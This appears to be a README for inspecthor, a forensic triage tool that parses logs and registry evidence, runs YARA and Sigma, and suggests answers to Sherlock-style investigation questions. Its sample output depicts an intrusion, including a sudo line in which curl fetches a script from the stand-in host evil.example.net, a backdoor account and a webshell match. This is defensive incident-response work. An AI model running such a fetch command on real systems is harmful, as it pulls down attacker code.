# inspecthor

```
██╗███╗   ██╗███████╗██████╗ ███████╗ ██████╗████████╗██╗  ██╗ ██████╗ ██████╗
██║████╗  ██║██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗
██║██╔██╗ ██║███████╗██████╔╝█████╗  ██║        ██║   ███████║██║   ██║██████╔╝
██║██║╚██╗██║╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██║██║   ██║██╔══██╗
██║██║ ╚████║███████║██║     ███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║  ██║
╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
```

Point it at forensic evidence. It tells you what happened.

> Only use this on evidence you are authorized to examine. Sherlock packages and
> real incident artifacts can contain live malware — work in a VM.

## Run it

```bash
inspecthor sherlock.zip
```

That's the tool. One command, no flags. It unpacks the archive, works out which
parser each file needs, reads them all, figures out the host's timezone and the
year on its own, runs YARA and Sigma, pulls out the indicators, finds the question
file the package shipped with, and answers it.

```
4 artifact(s) parsed, 10 events, 2 detection(s)
indicators: domain=2  ipv4=1  url=1

What the evidence says about itself
timezone  UTC                                       default (no timezone evidence found)
host      web01                                     most common host field in parsed events
year      2024                                      latest event in artifacts with absolute timestamps
activity  2024-03-01 09:10 to 2024-03-01 09:22 UTC  from artifacts with absolute timestamps

What stands out
 !!  2024-03-01 09:15:14  web01  admin     ssh_login_success  Brute-force SUCCESS: admin from 45.33.32.156 after 3 failures
 !!  2024-03-01 09:17:00  web01  backdoor  account_created    Local account created: backdoor
 !!  2024-03-01 09:20:11  web01            yara_match         YARA Inspecthor_Webshell_PHP matched shell.php
 !   2024-03-01 09:16:00  web01  admin     sudo_command       sudo: admin ran /usr/bin/curl http://evil.example.net/x.sh

The evidence came with 4 question(s)  (candidates — verify before submitting)

  What is the attacker's IP address?
    > 0.80  45.33.32.156   Attacker source IP — ssh_failed_login @ 2024-03-01 09:15:01 (4 occurrences)

  What account did the attacker create?
    > 0.85  backdoor   Account created by attacker — account_created @ 2024-03-01 09:17:00

Saved
  report   pkg-report.md
  timeline pkg-timeline.csv
  case     pkg.db
```

Every suggestion shows the event it came from. Nothing is submitted for you, and
nothing claims to be certain — `>` means it is confident, `·` means look closer.

## Then follow up

Three more commands, all working against the case you just analyzed:

```bash
inspecthor ask "when did they first log in?"     # answer one question
inspecthor find 45.33.32.156                     # search every artifact at once
inspecthor timeline                              # what happened, in order
```

`timeline --all` gives you everything instead of just the notable events. `find`
takes `--regex`. That is the whole interface.

## Install

```bash
git clone https://github.com/Cobrastrike62/Inspecthor && cd Inspecthor
./install.sh --full --link
```

`--full` adds every optional parser, `--link` puts the command on your PATH. On a
corporate network that intercepts TLS, add `--trusted-host`.

Without `--full` you get a stdlib-only install that still handles text, syslog,
JSON and SQLite evidence — the whole pipeline works, just fewer formats. When it
meets a file it cannot read, it says which install unlocks it:

```
! would parse with evtx — pip install 'inspecthor[evtx]'
```

Run `inspecthor` with no arguments to see what is available.

## What it reads

| Evidence | Needs |
|---|---|
| Linux `auth.log`, `secure`, `syslog` — including rotated and gzipped | nothing |
| Timestamped app logs, Apache/nginx access logs, plain text | nothing |
| Windows Event Logs — Security, System, PowerShell, Sysmon, Task, RDP, Defender | `--full` |
| Registry hives — Run keys, services, timezone, USB, UserAssist, amcache | `--full` |

Not yet: `$MFT`/`$J`, prefetch, LNK, SRUM, browser history, PCAP, memory, cloud
logs. Those are the next parsers.

## Why it can skip the flags

Classic syslog lines look like this:

```
Mar  1 09:15:01 web01 sshd[1010]: Failed password for admin from 45.33.32.156
```

No year. No UTC offset. Most tools make you supply both, and if you get them
wrong your Linux timeline silently sits in the wrong year next to your Windows
events.

inspecthor reads the rest of the evidence first. Event logs carry absolute UTC
timestamps, so they pin down the year. The registry records `TimeZoneInformation`
and `ComputerName`. It parses everything that dates itself, derives the context
from that, and only then reads the ambiguous files — which is why the normal case
needs no flags at all.

It always shows you what it worked out and where each value came from. If it is
wrong, override it:

```bash
inspecthor evidence/ --tz America/Chicago --year 2024 --host WS01
```

Other flags: `--out DIR` to put the outputs somewhere else, `--no-detect` to skip
YARA and Sigma, `--rules DIR` to add your own rules. `inspecthor analyze --help`
lists them.

## Adding your own detections

Drop a `.yar` or Sigma `.yml` into a directory and pass `--rules DIR`. No code.

One catch worth knowing: YARA's regex engine has no non-capturing groups. Write
`(a|b)`, never `(?:a|b)`, or the rule will not compile.

## Adding a parser

One file in `inspecthor/parsers/plugins/`. Nothing else to touch — the registry
finds it:

```python
@register
class PrefetchParser(Parser):
    name, display, category = "prefetch", "Windows Prefetch", "windows"
    magic = (b"MAM\x04",)
    path_globs = ("*.pf",)

    def parse(self, path, ctx):
        for name, run_time, count in _read(path):
            yield ctx.event(timestamp=run_time, timestamp_desc="Last Run",
                            event_type="process_exec", attck=["T1204"],
                            message=f"{name} executed (run #{count})")
```

[DESIGN.md](DESIGN.md) has the details — the parser contract, the event schema,
and why the pieces are shaped the way they are.

## Tests

```bash
pytest -q
```

Fully offline; every fixture is generated. Passes on a stdlib-only install, with
the format-specific tests skipping themselves.

## License

MIT — see [LICENSE](LICENSE).
